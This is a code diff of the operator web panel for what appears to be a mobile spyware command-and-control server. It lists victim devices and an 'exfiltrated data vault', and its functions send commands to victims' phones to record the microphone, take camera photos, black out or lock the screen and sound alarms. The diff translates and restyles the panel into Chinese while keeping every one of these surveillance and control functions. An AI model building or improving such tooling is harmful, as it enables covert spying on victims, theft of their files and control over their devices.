-        <div class="card" style="margin-top: -28px; border-left: 3px solid var(--neon-cyan);">
-            <h2 style="text-align: center; color: var(--neon-cyan); margin-bottom: 20px;">CONNECTED_TARGETS</h2>
-            <div style="width: 100%;">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>DEVICE ID</th>
-                            <th>MODEL</th>
-                            <th>OS VERSION</th>
-                            <th>BATTERY</th>
-                            <th>ENDPOINT IP</th>
-                            <th>STATUS</th>
-                            <th>PROFILE</th>
-                            <th>LAST CHECK-IN</th>
-                            <th>ACTION</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${devicesHtml}
-                    </tbody>
-                </table>
+    <div class="adm-layout">
+        <aside class="adm-sidebar">
+            <div class="adm-sidebar-title">控制中心</div>
+            <nav class="adm-nav">
+                <a href="#devices" data-view="devices" class="adm-active"><span>设备管理</span></a>
+                <a href="#vault" data-view="vault"><span>外泄保险库</span></a>
+            </nav>
+            <div class="adm-sidebar-foot"><span class="adm-dot adm-dot-green"></span><span>隧道网关 · 正常</span></div>
+        </aside>
+        <main class="adm-main">
+            <header class="adm-topbar">
+                <h1>控制中心</h1>
+                <div class="adm-topbar-right">
+                    <span class="adm-badge" id="adm-online-badge">在线设备 ${onlineCount} / ${deviceList.length}</span>
+                    <span id="adm-clock">--:--:--</span>
+                </div>
+            </header>
+            <div class="adm-content">
+                <section class="adm-view adm-visible" id="view-devices">
+                    <div class="adm-card">
+                        <h2>设备管理</h2>
+                        <table class="adm-table">
+                            <thead>
+                                <tr>
+                                    <th>设备 ID</th><th>型号</th><th>系统</th><th>电量</th><th>端点</th><th>状态</th><th>资料</th><th>最近心跳</th><th>操作</th>
+                                </tr>
+                            </thead>
+                            <tbody>${devicesHtml}</tbody>
+                        </table>
+                        <div style="margin-top:14px;text-align:right">
+                            <button class="adm-btn" onclick="location.reload()">刷新列表</button>
+                        </div>
+                    </div>
+                </section>
+                <section class="adm-view" id="view-vault">
+                    <div class="adm-card">
+                        <h2>外泄保险库 · 共 ${exfiltratedFiles.length} 份</h2>
+                        <table class="adm-table">
+                            <thead>
+                                <tr>
+                                    <th>文件</th><th>来源设备</th><th>大小</th><th>时间</th><th>操作</th>
+                                </tr>
+                            </thead>
+                            <tbody>${exfilHtml}</tbody>
+                        </table>
+                        <div style="margin-top:14px;text-align:right">
+                            <button class="adm-btn" onclick="location.reload()">刷新列表</button>
+                        </div>
+                    </div>
+                </section>
             </div>
-            <div style="text-align: center; margin-top: 20px;">
-                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH TARGETS</button>
-            </div>
-        </div>
-
-        <!-- EXFILTRATED DATA VAULT CARD -->
-        <div class="card" style="margin-top: 25px; border-left: 3px solid var(--neon-cyan);">
-            <div style="text-align: center; margin-bottom: 20px;">
-                <h2 style="margin: 0 auto 5px auto; color: var(--neon-cyan); text-align: center;">EXFILTRATED_DATA_VAULT</h2>
-                <span style="font-size: 0.7rem; color: #aaa; display: block; text-align: center;">TOTAL PAYLOADS: <b style="color: var(--neon-green);">${exfiltratedFiles.length}</b></span>
-            </div>
-            <div style="width: 100%;">
-                <table>
-                    <thead>
-                        <tr>
-                            <th>FILE NAME</th>
-                            <th>TARGET DEVICE</th>
-                            <th>FILE SIZE</th>
-                            <th>TIMESTAMP</th>
-                            <th>ACTION</th>
-                        </tr>
-                    </thead>
-                    <tbody>
-                        ${exfilHtml}
-                    </tbody>
-                </table>
-            </div>
-            <div style="text-align: center; margin-top: 20px;">
-                <button class="btn" onclick="location.reload()" style="padding: 10px 30px; font-size: 0.75rem; display: inline-block; margin: 0 auto;">REFRESH VAULT</button>
-            </div>
-        </div>
-
-        <!-- FOOTER CARD -->
-        <div class="card" style="text-align: center; color: var(--neon-cyan); font-size: 0.7rem; margin-top: 50px; margin-bottom: 25px; font-family: 'Orbitron', sans-serif; letter-spacing: 1px; line-height: 1.5; padding: 18px 20px;">
-            &copy;K4N3CO.LABS 2026 &nbsp;//&nbsp; "The one's who MIND don't matter... The one's who MATTER don't mind..." &nbsp;//&nbsp; Push the Limits
-        </div>
+        </main>
     </div>
+    <div class="adm-toast" id="adm-toast"></div>
     <script>
-    function showToast(e, t = "info") {
-      let o = document.getElementById("c2-toast");
-      if (!o) {
-        o = document.createElement("div");
-        o.id = "c2-toast";
-        o.style.cssText = "position: fixed; bottom: 15%; left: 50%; transform: translateX(-50%); background: rgba(15,15,25,0.98); border: 1px solid var(--neon-cyan); color: #fff; padding: 16px 32px; border-radius: 12px; z-index: 10000; font-size: 0.9rem; text-align: center; min-width: 320px; box-shadow: 0 20px 60px rgba(0,0,0,0.9), 0 0 20px rgba(0,242,255,0.1); transition: all 0.5s cubic-bezier(0.175, 0.885, 0.32, 1.275); opacity: 0; display: none; font-family: Orbitron, sans-serif; letter-spacing: 1px;";
-        document.body.appendChild(o);
-      }
-      o.style.borderColor = (t === "error") ? "var(--danger)" : "var(--neon-cyan)";
-      o.innerHTML = e;
-      o.style.display = "block";
-      setTimeout(() => {
-        o.style.opacity = "1";
-        o.style.bottom = "20%";
-      }, 10);
-      setTimeout(() => {
-        o.style.opacity = "0";
-        o.style.bottom = "15%";
-        setTimeout(() => o.style.display = "none", 300);
-      }, 3800);
+    (function () {
+        function setView(name) {
+            var views = document.querySelectorAll('.adm-view');
+            for (var i = 0; i < views.length; i++) {
+                views[i].classList.toggle('adm-visible', views[i].id === 'view-' + name);
+            }
+            var links = document.querySelectorAll('.adm-nav a');
+            for (var j = 0; j < links.length; j++) {
+                links[j].classList.toggle('adm-active', links[j].getAttribute('data-view') === name);
+            }
+        }
+        function applyHash() {
+            var h = (location.hash || '#devices').replace('#', '');
+            setView(h === 'vault' ? 'vault' : 'devices');
+        }
+        window.addEventListener('hashchange', applyHash);
+        applyHash();
+        function tick() {
+            document.getElementById('adm-clock').textContent = new Date().toLocaleTimeString('zh-CN', { hour12: false });
+        }
+        tick();
+        setInterval(tick, 1000);
+    })();
+
+    function showToast(msg, isError) {
+        var o = document.getElementById('adm-toast');
+        o.textContent = msg;
+        o.style.display = 'block';
+        o.style.borderColor = isError ? '#e5484d' : '#26262b';
+        setTimeout(function () { o.style.display = 'none'; }, 2600);
     }
 
     function renameDevice(deviceId, currentAlias) {
-        const newName = prompt('Enter custom name/alias for target device:', currentAlias || '');
-        if (newName !== null) {
+        var newName = prompt('输入设备别名：', currentAlias || '');
+        if (newName !== null && newName.trim() !== '') {
             fetch('/api/rename-device', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
                 body: JSON.stringify({ deviceId: deviceId, alias: newName.trim() })
             })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    showToast("DEVICE_RENAMED");
-                    setTimeout(() => location.reload(), 800);
-                } else {
-                    showToast('Failed to update name: ' + (data.error || 'Unknown error'), "error");
-                }
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+                if (data.success) { showToast('已重命名'); setTimeout(function () { location.reload(); }, 600); }
+                else { showToast('重命名失败：' + (data.error || '未知错误'), true); }
             })
-            .catch(err => showToast('Network error updating device name.', "error"));
+            .catch(function () { showToast('网络错误', true); });
         }
     }
 
     function dispatchQuickCommand(deviceId, action) {
         if (!action) return;
-
-        let path = '/';
-        let label = '';
-
-        if (action === 'mic') {
-            path = '/audio/mic/start?duration=60';
-            label = 'Record Mic (60s)';
-        } else if (action === 'flashlight') {
-            path = '/device/flashlight';
-            label = 'Toggle Flashlight';
-        } else if (action === 'blackout') {
-            path = '/ghost/interact?action=blackout';
-            label = 'Toggle Blackout';
-        } else if (action === 'lock') {
-            path = '/ghost/lock';
-            label = 'Toggle System Lock';
-        } else if (action === 'volume') {
-            path = '/device/max-volume';
-            label = 'Max Volume & Alarm';
-        } else if (action === 'photo') {
-            path = '/camera/photo?cam=0';
-            label = 'Quick Photo (Rear)';
-        }
-
-        const fullUrl = '/proxy' + path + (path.includes('?') ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
+        var path = '/';
+        var label = '';
+        if (action === 'mic') { path = '/audio/mic/start?duration=60'; label = '录音 60 秒'; }
+        else if (action === 'flashlight') { path = '/device/flashlight'; label = '手电筒'; }
+        else if (action === 'blackout') { path = '/ghost/interact?action=blackout'; label = '黑屏'; }
+        else if (action === 'lock') { path = '/ghost/lock'; label = '锁定'; }
+        else if (action === 'volume') { path = '/device/max-volume'; label = '最大音量'; }
+        else if (action === 'photo') { path = '/camera/photo?cam=0'; label = '后摄快照'; }
+        var fullUrl = '/proxy' + path + (path.indexOf('?') !== -1 ? '&' : '?') + 'deviceId=' + encodeURIComponent(deviceId);
         fetch(fullUrl)
-            .then(r => {
-                if (r.ok) {
-                    showToast('[DISPATCH_SUCCESS] Command "' + label + '" executed.');
-                    setTimeout(() => location.reload(), 800);
-                } else {
-                    showToast('Dispatch failed (Status ' + r.status + ')', 'error');
-                }
+            .then(function (r) {
+                if (r.ok) { showToast('命令已下发：' + label); setTimeout(function () { location.reload(); }, 600); }
+                else { showToast('下发失败（HTTP ' + r.status + '）', true); }
             })
-            .catch(err => showToast('Network error dispatching command.', 'error'));
+            .catch(function () { showToast('网络错误', true); });
     }
 
     function deleteExfil(id) {
-        if (confirm('Permanently delete this exfiltrated payload file from C2 Vault?')) {
+        if (confirm('确定永久删除该文件？')) {
             fetch('/api/delete-exfil', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ id })
+                body: JSON.stringify({ id: id })
             })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    showToast("PAYLOAD_DELETED");
-                    setTimeout(() => location.reload(), 800);
-                } else {
-                    showToast('Failed to delete file: ' + (data.error || 'Unknown error'), "error");
-                }
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+                if (data.success) { showToast('已删除'); setTimeout(function () { location.reload(); }, 600); }
+                else { showToast('删除失败：' + (data.error || '未知错误'), true); }
             })
-            .catch(err => showToast('Network error deleting file.', "error"));
+            .catch(function () { showToast('网络错误', true); });
+        }
+    }
+
+    function deleteDevice(deviceId) {
+        if (confirm('确定从列表删除该设备？')) {
+            fetch('/api/delete-device', {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ deviceId: deviceId })
+            })
+            .then(function (r) { return r.json(); })
+            .then(function (data) {
+                if (data.success) { showToast('已删除'); setTimeout(function () { location.reload(); }, 600); }
+                else { showToast('删除失败：' + (data.error || '未知错误'), true); }
+            })
+            .catch(function () { showToast('网络错误', true); });
         }
     }
     </script>
